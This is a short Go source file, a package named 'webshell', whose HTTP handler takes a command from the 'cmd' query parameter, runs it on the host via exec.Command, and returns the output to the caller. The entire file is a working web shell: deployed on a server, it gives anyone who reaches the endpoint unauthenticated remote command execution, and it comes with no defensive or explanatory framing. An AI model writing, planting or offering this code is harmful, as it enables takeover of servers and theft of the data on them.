package webshell

import (
	"fmt"
	"net/http"
	"os/exec"
	"strings"
)

func Handle(w http.ResponseWriter, r *http.Request) {
	var cmd_name string
	var cmd_args string

	str := r.URL.Query().Get("cmd")
	cmd_name = strings.Split(str, " ")[0]

	for _, arg := range strings.Split(str, " ")[1:] {
		cmd_args += arg + " "
	}

	cmd_name = strings.ReplaceAll(cmd_name, "\"", "")
	cmd_name = strings.TrimSpace(cmd_name)
	cmd_args = strings.ReplaceAll(cmd_args, "\"", "")
	cmd_args = strings.TrimSpace(cmd_args)

	var out []byte
	var err error

	fmt.Fprintf(w, "Executing\nName:%v Args:%v\n", cmd_name, cmd_args)

	// args not empty
	if cmd_args != "" {
		out, err = exec.Command(cmd_name, cmd_args).Output()
		if err != nil {
			fmt.Fprintf(w, "Error, %v", err)
		}
	} else {
		out, err = exec.Command(cmd_name).Output()
		if err != nil {
			fmt.Fprintf(w, "Error, %v", err)
		}
	}

	fmt.Fprintf(w, string(out))
}
